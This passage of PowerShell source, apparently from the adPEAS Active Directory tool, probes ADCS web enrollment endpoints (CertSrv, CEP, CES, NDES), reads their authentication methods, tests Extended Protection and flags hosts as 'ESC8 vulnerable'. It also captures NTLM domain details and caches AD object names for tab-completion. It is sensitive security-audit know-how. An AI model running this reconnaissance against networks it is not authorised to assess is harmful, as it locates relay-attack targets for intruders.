            Write-Log "[ScanADCS] WARNING: Invalid CAName '$CAName' - contains forbidden characters, skipping CES tests"
            $sanitizedCAName = $null
        }
        else {
            # URL-encode the CA name for safe use in URLs (handles spaces, etc.)
            $sanitizedCAName = [System.Uri]::EscapeDataString($CAName)
            Write-Log "[ScanADCS] Using CA name: $CAName (encoded: $sanitizedCAName)"
        }
    }

    Write-Log "[ScanADCS] Testing ADCS Web Enrollment for: $targetHost"

    # Track if server is reachable at all (for skip logic)
    $serverReachable = $false

    # ===== Test 1: HTTPS /certsrv/ =====
    $httpsUrl = "https://$targetHost/certsrv/"
    Write-Log "[ScanADCS] Testing HTTPS CertSrv: $httpsUrl"

    $httpsResult = Test-ADCSEndpoint -Url $httpsUrl -EndpointName "CertSrv" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($httpsResult.Reachable) {
        $serverReachable = $true
    }
    if ($httpsResult.IsADCSEndpoint) {
        $result.HttpsAvailable = $true
        $result.HttpsStatusCode = $httpsResult.StatusCode
        $result.Success = $true
        $result.Endpoints.CertSrv.Available = $true
        $result.Endpoints.CertSrv.AvailableHttps = $true
        $result.Endpoints.CertSrv.AuthMethods = $httpsResult.AuthMethods -join ', '

        if ($httpsResult.ServerHeader) {
            $result.ServerHeader = $httpsResult.ServerHeader
        }

        Write-Log "[ScanADCS] CertSrv HTTPS available (HTTP $($httpsResult.StatusCode)), Auth: $($httpsResult.AuthMethods -join ', ')"
    }
    elseif ($httpsResult.Reachable) {
        Write-Log "[ScanADCS] CertSrv HTTPS responded but is not ADCS (likely load balancer redirect)"
    }

    # ===== Test 2: HTTP /certsrv/ =====
    $httpUrl = "http://$targetHost/certsrv/"
    Write-Log "[ScanADCS] Testing HTTP CertSrv: $httpUrl"

    $httpResult = Test-ADCSEndpoint -Url $httpUrl -EndpointName "CertSrv" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
    if ($httpResult.Reachable) {
        $serverReachable = $true
    }
    if ($httpResult.IsADCSEndpoint) {
        $result.HttpAvailable = $true
        $result.HttpStatusCode = $httpResult.StatusCode
        $result.Success = $true
        $result.Endpoints.CertSrv.Available = $true
        $result.Endpoints.CertSrv.AvailableHttp = $true

        # Update auth methods if not already set from HTTPS
        if ([string]::IsNullOrEmpty($result.Endpoints.CertSrv.AuthMethods) -and $httpResult.AuthMethods.Count -gt 0) {
            $result.Endpoints.CertSrv.AuthMethods = $httpResult.AuthMethods -join ', '
        }
        if (-not $result.ServerHeader -and $httpResult.ServerHeader) {
            $result.ServerHeader = $httpResult.ServerHeader
        }

        Write-Log "[ScanADCS] CertSrv HTTP available (HTTP $($httpResult.StatusCode)), Auth: $($httpResult.AuthMethods -join ', ')"
    }
    elseif ($httpResult.Reachable) {
        Write-Log "[ScanADCS] CertSrv HTTP responded but is not ADCS (likely load balancer redirect)"
    }

    # ===== Test 3 & 4: Additional endpoints (only if server is reachable) =====
    # Skip CEP/CES/NDES tests if server not reachable at all
    # This avoids unnecessary timeouts against offline servers
    if ($serverReachable) {
        # ===== Test 3: CEP (Certificate Enrollment Policy) - HTTPS only =====
        # Default pattern: /ADPolicyProvider_CEP_Kerberos/service.svc
        $cepUrl = "https://$targetHost/ADPolicyProvider_CEP_Kerberos/service.svc"
        Write-Log "[ScanADCS] Testing CEP: $cepUrl"

        $cepResult = Test-ADCSEndpoint -Url $cepUrl -EndpointName "CEP" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
        if ($cepResult.IsADCSEndpoint) {
            $result.Endpoints.CEP.Available = $true
            $result.Endpoints.CEP.AvailableHttps = $true
            $result.Endpoints.CEP.AuthMethods = $cepResult.AuthMethods -join ', '
            $result.Success = $true
            Write-Log "[ScanADCS] CEP available (HTTP $($cepResult.StatusCode)), Auth: $($cepResult.AuthMethods -join ', ')"
        }
        elseif ($cepResult.Reachable) {
            Write-Log "[ScanADCS] CEP responded but is not ADCS (likely load balancer redirect)"
        }

        # ===== Test 4: CES (Certificate Enrollment Service) - requires CAName =====
        # CES URL pattern: /<CAName>_CES_<AuthType>/service.svc
        # Only test if CAName parameter is provided and validated
        if ($sanitizedCAName) {
            $cesUrl = "https://$targetHost/${sanitizedCAName}_CES_Kerberos/service.svc"
            Write-Log "[ScanADCS] Testing CES: $cesUrl"

            $cesResult = Test-ADCSEndpoint -Url $cesUrl -EndpointName "CES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
            if ($cesResult.IsADCSEndpoint) {
                $result.Endpoints.CES.Available = $true
                $result.Endpoints.CES.AvailableHttps = $true
                $result.Endpoints.CES.AuthMethods = $cesResult.AuthMethods -join ', '
                $result.Success = $true
                Write-Log "[ScanADCS] CES available (HTTP $($cesResult.StatusCode)), Auth: $($cesResult.AuthMethods -join ', ')"
            }
            elseif ($cesResult.Reachable) {
                Write-Log "[ScanADCS] CES responded but is not ADCS (likely load balancer redirect)"
            }
        } else {
            Write-Log "[ScanADCS] Skipping CES test - CAName parameter not provided"
        }

        # ===== Test 5: NDES (Network Device Enrollment Service) - HTTPS first, then HTTP =====
        $ndesUrl = "https://$targetHost/CertSrv/mscep/"
        Write-Log "[ScanADCS] Testing NDES HTTPS: $ndesUrl"

        $ndesResult = Test-ADCSEndpoint -Url $ndesUrl -EndpointName "NDES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
        if ($ndesResult.IsADCSEndpoint) {
            $result.Endpoints.NDES.Available = $true
            $result.Endpoints.NDES.AvailableHttps = $true
            $result.Endpoints.NDES.AuthMethods = $ndesResult.AuthMethods -join ', '
            $result.Success = $true
            Write-Log "[ScanADCS] NDES HTTPS available (HTTP $($ndesResult.StatusCode)), Auth: $($ndesResult.AuthMethods -join ', ')"
        }
        elseif ($ndesResult.Reachable) {
            Write-Log "[ScanADCS] NDES HTTPS responded but is not ADCS (likely load balancer redirect)"
        }

        # Try HTTP fallback for NDES if HTTPS didn't find it
        if (-not $result.Endpoints.NDES.Available) {
            $ndesHttpUrl = "http://$targetHost/CertSrv/mscep/"
            Write-Log "[ScanADCS] Testing NDES HTTP fallback: $ndesHttpUrl"

            $ndesHttpResult = Test-ADCSEndpoint -Url $ndesHttpUrl -EndpointName "NDES" -TimeoutSeconds $TimeoutSeconds -UserAgent $UserAgent
            if ($ndesHttpResult.IsADCSEndpoint) {
                $result.Endpoints.NDES.Available = $true
                $result.Endpoints.NDES.AvailableHttp = $true
                $result.Endpoints.NDES.AuthMethods = $ndesHttpResult.AuthMethods -join ', '
                $result.Success = $true
                Write-Log "[ScanADCS] NDES HTTP available (HTTP $($ndesHttpResult.StatusCode)), Auth: $($ndesHttpResult.AuthMethods -join ', ')"
            }
        }
    } else {
        Write-Log "[ScanADCS] Skipping CEP/CES/NDES tests - server not reachable"
    }

    # Derive the global protocol flags from the per-endpoint transport so they reflect ANY
    # endpoint (CEP/CES/NDES previously did not update them). Additive: never clears a flag.
    foreach ($epName in @('CertSrv', 'CEP', 'CES', 'NDES')) {
        $ep = $result.Endpoints.$epName
        if ($ep.AvailableHttp)  { $result.HttpAvailable  = $true }
        if ($ep.AvailableHttps) { $result.HttpsAvailable = $true }
    }

    # Set error if nothing found
    if (-not $result.Success) {
        $result.Error = "No ADCS web enrollment endpoints found (server may be offline or not running ADCS web services)"
    }

    # Log summary of available endpoints with their auth methods
    $availableEndpoints = @()
    foreach ($ep in @('CertSrv', 'CEP', 'CES', 'NDES')) {
        if ($result.Endpoints.$ep.Available) {
            $authStr = if ($result.Endpoints.$ep.AuthMethods) { " ($($result.Endpoints.$ep.AuthMethods))" } else { "" }
            $availableEndpoints += "$ep$authStr"
        }
    }
    if ($availableEndpoints.Count -gt 0) {
        Write-Log "[ScanADCS] Detection complete - Available endpoints: $($availableEndpoints -join ', ')"
    } else {
        Write-Log "[ScanADCS] Detection complete - No ADCS endpoints found"
    }

    # ===== Extended Protection for Authentication (EPA) Test =====
    # Test EPA for EACH endpoint separately because IIS allows different EPA settings per virtual directory
    # Only test if:
    # 1. -TestEPA switch is specified
    # 2. HTTPS is available (EPA only applies to TLS connections)
    # 3. NTLM is in the authentication methods (EPA binds NTLM to TLS channel)
    if ($TestEPA -and $result.Success) {
        Write-Log "[ScanADCS] Testing Extended Protection for Authentication (EPA) per endpoint..."

        # Use longer timeout for EPA test (NTLM handshake needs more time)
        $epaTimeout = [Math]::Max($TimeoutSeconds, 10)

        # Track if we've set the legacy EPA properties (first endpoint with NTLM)
        $legacyEPASet = $false

        # Test EPA for each available endpoint with NTLM over HTTPS
        foreach ($ep in @('CertSrv', 'CEP', 'CES', 'NDES')) {
            if ($result.Endpoints.$ep.Available -and $result.Endpoints.$ep.AuthMethods -match 'NTLM') {
                # Build test URL based on endpoint
                # CES URL requires the CA name which can be passed via -CAName parameter
                # The pattern is: <CAName>_CES_<AuthType>/service.svc
                $epaTestUrl = switch ($ep) {
                    'CertSrv' { "https://$targetHost/certsrv/" }
                    'CEP' { "https://$targetHost/ADPolicyProvider_CEP_Kerberos/service.svc" }
                    'CES' {
                        if ($sanitizedCAName) {
                            "https://$targetHost/${sanitizedCAName}_CES_Kerberos/service.svc"
                        } else {
                            $null  # Cannot construct CES URL without validated CA name
                        }
                    }
                    'NDES' { "https://$targetHost/CertSrv/mscep/" }
                }

                # Skip if we couldn't construct the URL (e.g., CES without CAName)
                if (-not $epaTestUrl) {
                    Write-Log "[ScanADCS] Skipping EPA test for $ep - URL cannot be determined without CA name parameter"
                    continue
                }

                Write-Log "[ScanADCS] Testing EPA for $ep at $epaTestUrl"
                $epaResult = Test-ExtendedProtection -Url $epaTestUrl -TimeoutSeconds $epaTimeout -UserAgent $UserAgent

                # Store EPA result in the endpoint object
                $result.Endpoints.$ep.EPAEnabled = $epaResult.EPAEnabled
                $result.Endpoints.$ep.EPAConfidence = $epaResult.Confidence

                if ($epaResult.Success) {
                    if ($epaResult.EPAEnabled -eq $true) {
                        Write-Log "[ScanADCS] $ep EPA ENABLED ($($epaResult.Confidence) confidence)"
                    }
                    elseif ($epaResult.EPAEnabled -eq $false) {
                        Write-Log "[ScanADCS] $ep EPA DISABLED ($($epaResult.Confidence) confidence) - ESC8 vulnerable!"
                    }
                    else {
                        Write-Log "[ScanADCS] $ep EPA status: $($epaResult.DiagnosticInfo)"
                    }
                }
                else {
                    Write-Log "[ScanADCS] $ep EPA test failed: $($epaResult.ErrorMessage)"
                }

                # Set legacy properties from first endpoint with NTLM (backward compatibility)
                if (-not $legacyEPASet) {
                    $result.EPAEnabled = $epaResult.EPAEnabled
                    $result.EPAConfidence = $epaResult.Confidence
                    $result.EPADiagnostic = $epaResult.DiagnosticInfo

                    # Capture NTLM information from first successful EPA test
                    if ($epaResult.Type2Received) {
                        $result.NTLMInfo = [PSCustomObject]@{
                            NbComputerName  = $epaResult.NbComputerName      # NetBIOS computer name
                            NbDomainName    = $epaResult.NbDomainName        # NetBIOS domain name
                            DnsComputerName = $epaResult.DnsComputerName     # DNS computer name (FQDN)
                            DnsDomainName   = $epaResult.DnsDomainName       # DNS domain name
                            DnsTreeName     = $epaResult.DnsTreeName         # DNS forest name
                            ServerTimestamp = $epaResult.ServerTimestamp     # Server time (DateTime)
                            NTLMChallenge   = $epaResult.NTLMChallenge       # NTLM challenge (hex)
                            SourceEndpoint  = $ep                            # Which endpoint provided this info
                        }
                        Write-Log "[ScanADCS] NTLM Info captured from $ep - Server: $($epaResult.DnsComputerName), Domain: $($epaResult.DnsDomainName)"
                    }

                    $legacyEPASet = $true
                }
            }
        }

        # If no NTLM endpoints found over HTTPS
        if (-not $legacyEPASet) {
            if (-not $result.HttpsAvailable) {
                $result.EPAEnabled = $false
                $result.EPAConfidence = "High"
                $result.EPADiagnostic = "HTTP only - no TLS channel for EPA to bind to"
                Write-Log "[ScanADCS] EPA not applicable - HTTP only (no TLS)"
            }
            else {
                $result.EPADiagnostic = "NTLM not offered over HTTPS - EPA test not applicable"
                Write-Log "[ScanADCS] EPA test skipped - no NTLM over HTTPS"
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Tests a single ADCS endpoint for availability and authentication methods.
.DESCRIPTION
    Tests whether an HTTP endpoint is a real ADCS endpoint or just a load balancer redirect.

    Key validation logic for redirects (HTTP 301/302):
    - Load balancers often redirect ALL requests to a login page (generic redirect)
    - Real ADCS redirects go to ADCS-specific paths (e.g., /certsrv/default.asp)
    - We validate the Location header to distinguish between these cases

    ADCS-specific redirect patterns:
    - /certsrv/ (Certificate Services web enrollment)
    - /CertSrv/ (case variations)
    - /ADPolicyProvider_CEP (Certificate Enrollment Policy)
    - /CES_ (Certificate Enrollment Service)
    - /mscep/ (NDES - Network Device Enrollment Service)
#>
function Test-ADCSEndpoint {
    [CmdletBinding()]
    param(
        [string]$Url,
        [string]$EndpointName = "ADCS",
        [int]$TimeoutSeconds,
        [string]$UserAgent
    )

    $endpointResult = [PSCustomObject]@{
        Reachable        = $false      # Server responded (any HTTP response)
        IsADCSEndpoint   = $false      # Confirmed to be ADCS (not a load balancer redirect)
        StatusCode       = $null
        AuthMethods      = @()
        ServerHeader     = $null
        RedirectLocation = $null       # For debugging redirect issues
    }

    # Validate URL before creating WebRequest
    if ([string]::IsNullOrWhiteSpace($Url)) {
        Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Empty URL provided"
        return $endpointResult
    }

    $response = $null

    # Use Script-scope redirect patterns defined at module level
    $adcsRedirectPatterns = $Script:ADCSRedirectPatterns

    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = $UserAgent
        $request.AllowAutoRedirect = $false  # Don't follow redirects to capture auth headers

        $response = $request.GetResponse()
        $statusCode = [int]$response.StatusCode
        $endpointResult.Reachable = $true
        $endpointResult.StatusCode = $statusCode
        $endpointResult.ServerHeader = $response.Headers['Server']

        # Check if this is a redirect (301/302)
        if ($statusCode -in @(301, 302)) {
            $location = $response.Headers['Location']
            $endpointResult.RedirectLocation = $location

            Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Got redirect (HTTP $statusCode), checking location: $location"

            # Validate if redirect goes to an ADCS-specific path
            $isADCSRedirect = $false
            if ($location) {
                foreach ($pattern in $adcsRedirectPatterns) {
                    if ($location.ToLower().Contains($pattern.ToLower())) {
                        $isADCSRedirect = $true
                        Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Redirect to ADCS path (matched $pattern)"
                        break
                    }
                }
                if (-not $isADCSRedirect) {
                    Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Redirect to non-ADCS path: $location"
                }
            }

            $endpointResult.IsADCSEndpoint = $isADCSRedirect
        }
        else {
            # Success (200 OK) - this IS an ADCS endpoint (unusual without auth, but possible)
            $endpointResult.IsADCSEndpoint = $true

            # Check for WWW-Authenticate header even on 200 OK
            # (Windows Integrated Auth may auto-authenticate and still include the header)
            $wwwAuth = $response.Headers['WWW-Authenticate']
            if ($wwwAuth) {
                $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                Write-Log "[Test-ADCSEndpoint] ${EndpointName}: 200 OK with WWW-Authenticate: $($endpointResult.AuthMethods -join ', ')"
            }
        }
    }
    catch [System.Net.WebException] {
        $webEx = $_.Exception
        try {
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                $endpointResult.StatusCode = $statusCode

                # 401 Unauthorized = endpoint exists, requires auth (expected for certsrv)
                # 403 Forbidden = endpoint exists, access denied (may still have WWW-Authenticate)
                if ($statusCode -in @(401, 403)) {
                    $endpointResult.Reachable = $true

                    # Extract WWW-Authenticate header (contains auth methods)
                    $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
                    if ($wwwAuth) {
                        $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                        $endpointResult.IsADCSEndpoint = $true
                    }
                    elseif ($statusCode -eq 403 -and $Url -notmatch '^https://') {
                        # HTTP 403 without WWW-Authenticate on plain HTTP:
                        # IIS returns this when "Require SSL" is configured (IIS sub-code 403.4).
                        # The 403.4 sub-code only appears in IIS server logs - the HTTP response
                        # itself only carries a plain 403 with no auth challenge and no SSL hint header.
                        # In this case the endpoint is NOT actually accessible via HTTP - mark as
                        # reachable (server responded) but NOT as an ADCS endpoint.
                        $endpointResult.IsADCSEndpoint = $false
                        Write-Log "[Test-ADCSEndpoint] ${EndpointName}: HTTP 403 without WWW-Authenticate on plain HTTP - likely IIS 403.4 (SSL Required), not counting as HTTP-available"
                    }
                    else {
                        # HTTPS 403 without WWW-Authenticate, or any other 403 with auth:
                        # Still an ADCS endpoint (auth required via TLS)
                        $endpointResult.IsADCSEndpoint = $true
                        Write-Log "[Test-ADCSEndpoint] ${EndpointName}: HTTP $statusCode without WWW-Authenticate (HTTPS or unknown context)"
                    }

                    # Capture server header
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                }
                # 404 Not Found - Server is reachable but endpoint doesn't exist
                elseif ($statusCode -eq 404) {
                    $endpointResult.Reachable = $true
                    $endpointResult.IsADCSEndpoint = $false
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    Write-Log "[Test-ADCSEndpoint] ${EndpointName}: HTTP 404 - endpoint not found (server reachable)"
                }
                # 500/502/503 - Server errors indicate the endpoint exists but has issues
                # Still mark as reachable (server responded) but NOT as ADCS endpoint
                elseif ($statusCode -in @(500, 502, 503)) {
                    $endpointResult.Reachable = $true
                    $endpointResult.IsADCSEndpoint = $false
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']
                    Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Server error (HTTP $statusCode) - endpoint may exist but has issues"
                }
                # 301/302 Redirect - need to validate WHERE it redirects to
                elseif ($statusCode -in @(301, 302)) {
                    $endpointResult.Reachable = $true

                    # Get the redirect location
                    $location = $webEx.Response.Headers['Location']
                    $endpointResult.RedirectLocation = $location
                    $endpointResult.ServerHeader = $webEx.Response.Headers['Server']

                    Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Got redirect (HTTP $statusCode), checking location: $location"

                    # Validate if redirect goes to an ADCS-specific path
                    $isADCSRedirect = $false
                    if ($location) {
                        foreach ($pattern in $adcsRedirectPatterns) {
                            if ($location.ToLower().Contains($pattern.ToLower())) {
                                $isADCSRedirect = $true
                                Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Redirect to ADCS path (matched $pattern)"
                                break
                            }
                        }
                        if (-not $isADCSRedirect) {
                            Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Redirect to non-ADCS path (load balancer?): $location"
                        }
                    }

                    $endpointResult.IsADCSEndpoint = $isADCSRedirect

                    # For real ADCS redirects, try to get auth methods from the redirect target
                    if ($isADCSRedirect -and $location) {
                        $wwwAuth = $webEx.Response.Headers['WWW-Authenticate']
                        if ($wwwAuth) {
                            $endpointResult.AuthMethods = Parse-WWWAuthenticateHeader -HeaderValue $wwwAuth
                        }
                    }
                }
            }
        }
        finally {
            # Dispose WebException response (both Close and Dispose)
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
        }
    }
    catch {
        Write-Log "[Test-ADCSEndpoint] ${EndpointName}: Error testing ${Url}: $_"
    }
    finally {
        if ($response) {
            try { $response.Close() } catch { }
            try { $response.Dispose() } catch { }
        }
    }

    return $endpointResult
}

<#
.SYNOPSIS
    Parses WWW-Authenticate header value and extracts authentication methods.
.DESCRIPTION
    Handles the complexities of WWW-Authenticate header parsing:
    - Multiple schemes in one header (comma-separated)
    - Schemes with parameters (e.g., 'Digest realm="test", qop=auth')
    - Multiple headers combined by WebHeaderCollection
    - NTLM/Negotiate with Base64 blob data (e.g., 'NTLM TlRMTVNT...')
    - Case-insensitive matching for scheme names
#>
function Parse-WWWAuthenticateHeader {
    [CmdletBinding()]
    param(
        [string]$HeaderValue
    )

    $authMethods = @()

    if ([string]::IsNullOrWhiteSpace($HeaderValue)) {
        return $authMethods
    }

    # Known authentication schemes (order matters - check specific schemes first)
    $knownSchemes = @('Negotiate', 'NTLM', 'Basic', 'Digest', 'Kerberos', 'Bearer')

    # Handle multiple comma-separated schemes and schemes with Base64 blobs
    # WWW-Authenticate can look like:
    # - "Negotiate, NTLM" (multiple schemes)
    # - "NTLM TlRMTVNTUAACAA..." (scheme with Base64 blob - Type2 challenge)
    # - "Negotiate TlRMTVNTUA..." (Negotiate with NTLM blob)
    # - "Digest realm=..., qop=auth" (scheme with parameters)

    foreach ($scheme in $knownSchemes) {
        # Case-insensitive match for scheme name
        # Pattern matches:
        # 1. Scheme at start of string: "NTLM ..." or "NTLM,"
        # 2. Scheme after comma/space: ", NTLM" or " NTLM"
        # 3. Scheme followed by space (blob), comma (next scheme), equals (params), or end
        # The negative lookbehind (?<![A-Za-z]) prevents matching "NTLM" inside "XNTLM" or similar
        if ($HeaderValue -imatch "(?:^|[\s,])$scheme(?:\s+[A-Za-z0-9+/=]+)?(?:[\s,]|$)") {
            $authMethods += $scheme
        }
        # Also check for scheme followed immediately by space and base64 blob (common for NTLM Type2)
        elseif ($HeaderValue -imatch "(?:^|[\s,])$scheme\s+[A-Za-z0-9+/]{10,}") {
            $authMethods += $scheme
        }
    }

    # If no known schemes found but header is not empty, log for debugging
    if ($authMethods.Count -eq 0 -and $HeaderValue.Length -gt 0) {
        Write-Log "[Parse-WWWAuthenticateHeader] Unknown auth header format: $($HeaderValue.Substring(0, [Math]::Min(50, $HeaderValue.Length)))..."
    }

    return $authMethods | Select-Object -Unique
}

#endregion



# ----- Register-adPEASCompleters.ps1 -----

<#
.SYNOPSIS
    Registers tab-completion for adPEAS Get-Domain*, Set-Domain* and Request-ADCSCertificate functions.

.DESCRIPTION
    Register-adPEASCompleters provides tab-completion functionality for:
    - Identity parameters in Get-DomainUser, Get-DomainComputer, Get-DomainGroup, Get-DomainGPO
    - Identity parameters in Set-DomainUser, Set-DomainComputer, Set-DomainGroup, Set-DomainGPO, Set-DomainObject
    - TemplateName parameter in Request-ADCSCertificate

    Tab-completion allows users to quickly find and select AD objects by typing the first few characters and pressing TAB.

    LAZY LOADING: The cache is built automatically on first TAB press for each object type.
    - No upfront performance cost at Connect-adPEAS time
    - Cache is built per object type only when needed (e.g., first TAB on Get-DomainUser builds Users cache only)
    - If LDAP connection exists and cache is empty, pressing TAB triggers automatic cache build
    - Failed cache build attempts are tracked to prevent repeated failed queries

    MANUAL CACHE BUILD: You can also pre-build the cache explicitly:
    - Connect-adPEAS -BuildCompletionCache (builds all object types at connect time)
    - Build-CompletionCache -ObjectTypes @('Users', 'Groups') (builds specific types)

    The cache is stored in $Script:CompletionCache with the following structure:
    @{
        Users     = @("sAMAccountName1", "sAMAccountName2", ...)
        Computers = @("sAMAccountName1", "sAMAccountName2", ...)
        Groups    = @("sAMAccountName1", "sAMAccountName2", ...)
        GPOs      = @("displayName1", "displayName2", ...)
        Templates = @("templateName1", "templateName2", ...)
    }

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

# Initialize completion cache if not exists
if (-not $Script:CompletionCache) {
    $Script:CompletionCache = @{
        Users     = @()
        Computers = @()
        Groups    = @()
        GPOs      = @()
        Templates = @()
    }
}

# Track which object types have been attempted for lazy loading (prevents repeated failed attempts)
if (-not $Script:CompletionCacheAttempted) {
    $Script:CompletionCacheAttempted = @{
        Users     = $false
        Computers = $false
        Groups    = $false
        GPOs      = $false
        Templates = $false
    }
}

<#
.SYNOPSIS
    Builds the tab-completion cache by querying AD for object names.

.DESCRIPTION
    Build-CompletionCache queries Active Directory to populate the completion cache with sAMAccountNames (for Users, Computers, Groups) and displayNames (for GPOs).
    This function is called by Connect-adPEAS when -BuildCompletionCache is specified.

.PARAMETER ObjectTypes
    Array of object types to cache. Valid values: Users, Computers, Groups, GPOs, All.
    Default: All

.EXAMPLE
    Build-CompletionCache
    Builds cache for all object types.

.EXAMPLE
    Build-CompletionCache -ObjectTypes @('Users', 'Groups')
    Builds cache only for Users and Groups.
#>
function Build-CompletionCache {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [ValidateSet('Users', 'Computers', 'Groups', 'GPOs', 'Templates', 'All')]
        [string[]]$ObjectTypes = @('All')
    )

    process {
        # Check if we have an active connection
        # UNIFIED: Check for LdapConnection (works for both LDAP and LDAPS)
        if (-not $Script:LdapConnection) {
            Write-Warning "[Build-CompletionCache] No active LDAP connection. Use Connect-adPEAS first."
            return
        }

        Write-Log "[Build-CompletionCache] Building tab-completion cache..."

        $buildAll = $ObjectTypes -contains 'All'

        # Cache Users
        if ($buildAll -or $ObjectTypes -contains 'Users') {
            Write-Log "[Build-CompletionCache] Caching user sAMAccountNames..."
            try {
                $Script:CompletionCache.Users = @(
                    Get-DomainUser -Properties @('sAMAccountName') |
                    Where-Object { $_.sAMAccountName } |
                    Select-Object -ExpandProperty sAMAccountName |
                    Sort-Object
                )
                Write-Log "[Build-CompletionCache] Cached $($Script:CompletionCache.Users.Count) users"
            }
            catch {
                Write-Log "[Build-CompletionCache] Error caching users: $_"
                $Script:CompletionCache.Users = @()
            }
        }

        # Cache Computers
        if ($buildAll -or $ObjectTypes -contains 'Computers') {
            Write-Log "[Build-CompletionCache] Caching computer sAMAccountNames..."
            try {
                $Script:CompletionCache.Computers = @(
                    Get-DomainComputer -Properties @('sAMAccountName') |
                    Where-Object { $_.sAMAccountName } |
                    Select-Object -ExpandProperty sAMAccountName |
                    ForEach-Object { $_ -replace '\$$', '' } |  # Remove trailing $ from computer accounts
                    Sort-Object
                )
                Write-Log "[Build-CompletionCache] Cached $($Script:CompletionCache.Computers.Count) computers"
            }
            catch {
                Write-Log "[Build-CompletionCache] Error caching computers: $_"
                $Script:CompletionCache.Computers = @()
            }
        }

        # Cache Groups
        if ($buildAll -or $ObjectTypes -contains 'Groups') {
            Write-Log "[Build-CompletionCache] Caching group sAMAccountNames..."
            try {
                $Script:CompletionCache.Groups = @(
                    Get-DomainGroup -Properties @('sAMAccountName') |
                    Where-Object { $_.sAMAccountName } |
                    Select-Object -ExpandProperty sAMAccountName |
                    Sort-Object
                )
                Write-Log "[Build-CompletionCache] Cached $($Script:CompletionCache.Groups.Count) groups"
            }
            catch {
                Write-Log "[Build-CompletionCache] Error caching groups: $_"
                $Script:CompletionCache.Groups = @()
            }
        }

        # Cache GPOs
        if ($buildAll -or $ObjectTypes -contains 'GPOs') {
            Write-Log "[Build-CompletionCache] Caching GPO displayNames..."
            try {
                $Script:CompletionCache.GPOs = @(
                    Get-DomainGPO -Properties @('displayName') |
                    Where-Object { $_.displayName } |
                    Select-Object -ExpandProperty displayName |
                    Sort-Object
                )
                Write-Log "[Build-CompletionCache] Cached $($Script:CompletionCache.GPOs.Count) GPOs"
            }
            catch {
                Write-Log "[Build-CompletionCache] Error caching GPOs: $_"
                $Script:CompletionCache.GPOs = @()
            }
        }

        # Cache Certificate Templates (from CA Enrollment Services)
        if ($buildAll -or $ObjectTypes -contains 'Templates') {
            Write-Log "[Build-CompletionCache] Caching certificate template names from CAs..."
            try {
                $Script:CompletionCache.Templates = @(
                    Get-CertificateAuthority |
                    Where-Object { -not $_._QueryError -and $_.CertificateTemplates } |
                    ForEach-Object { $_.CertificateTemplates } |
                    Sort-Object -Unique
                )
                $Script:CompletionCacheAttempted.Templates = $true
                Write-Log "[Build-CompletionCache] Cached $($Script:CompletionCache.Templates.Count) certificate templates"
            }
            catch {
                Write-Log "[Build-CompletionCache] Error caching templates: $_"
                $Script:CompletionCache.Templates = @()
                $Script:CompletionCacheAttempted.Templates = $true
            }
        }

        # Summary
        $totalCached = $Script:CompletionCache.Users.Count +
                       $Script:CompletionCache.Computers.Count +
                       $Script:CompletionCache.Groups.Count +
                       $Script:CompletionCache.GPOs.Count +
                       $Script:CompletionCache.Templates.Count

        Write-Log "[Build-CompletionCache] Cache built: $($Script:CompletionCache.Users.Count) users, $($Script:CompletionCache.Computers.Count) computers, $($Script:CompletionCache.Groups.Count) groups, $($Script:CompletionCache.GPOs.Count) GPOs, $($Script:CompletionCache.Templates.Count) templates (Total: $totalCached)"
    }
}

<#
.SYNOPSIS
    Clears the tab-completion cache.

.DESCRIPTION
    Clear-CompletionCache removes all cached entries from the completion cache.
    Useful when switching domains or when the cache becomes stale.

.EXAMPLE
    Clear-CompletionCache
    Clears all cached completion data.
#>
function Clear-CompletionCache {
    [CmdletBinding()]
    param()

    process {
        $Script:CompletionCache = @{
            Users     = @()
            Computers = @()
            Groups    = @()
            GPOs      = @()
            Templates = @()
        }
        # Reset lazy loading flags so cache can be rebuilt
        $Script:CompletionCacheAttempted = @{
            Users     = $false
            Computers = $false
            Groups    = $false
            GPOs      = $false
            Templates = $false
        }
        Write-Log "[Clear-CompletionCache] Completion cache cleared"
    }
}

<#
.SYNOPSIS
    Gets statistics about the current completion cache.

.DESCRIPTION
    Get-CompletionCacheStats returns information about the current state of the completion cache, including counts for each object type.

.EXAMPLE
    Get-CompletionCacheStats
    Returns cache statistics.
#>
function Get-CompletionCacheStats {
    [CmdletBinding()]
    param()

    process {
        [PSCustomObject]@{
            Users     = $Script:CompletionCache.Users.Count
            Computers = $Script:CompletionCache.Computers.Count
            Groups    = $Script:CompletionCache.Groups.Count
            GPOs      = $Script:CompletionCache.GPOs.Count
            Templates = $Script:CompletionCache.Templates.Count
            Total     = ($Script:CompletionCache.Users.Count +
                        $Script:CompletionCache.Computers.Count +
                        $Script:CompletionCache.Groups.Count +
                        $Script:CompletionCache.GPOs.Count +
                        $Script:CompletionCache.Templates.Count)
            CacheExists = ($Script:CompletionCache.Users.Count -gt 0 -or
                          $Script:CompletionCache.Computers.Count -gt 0 -or
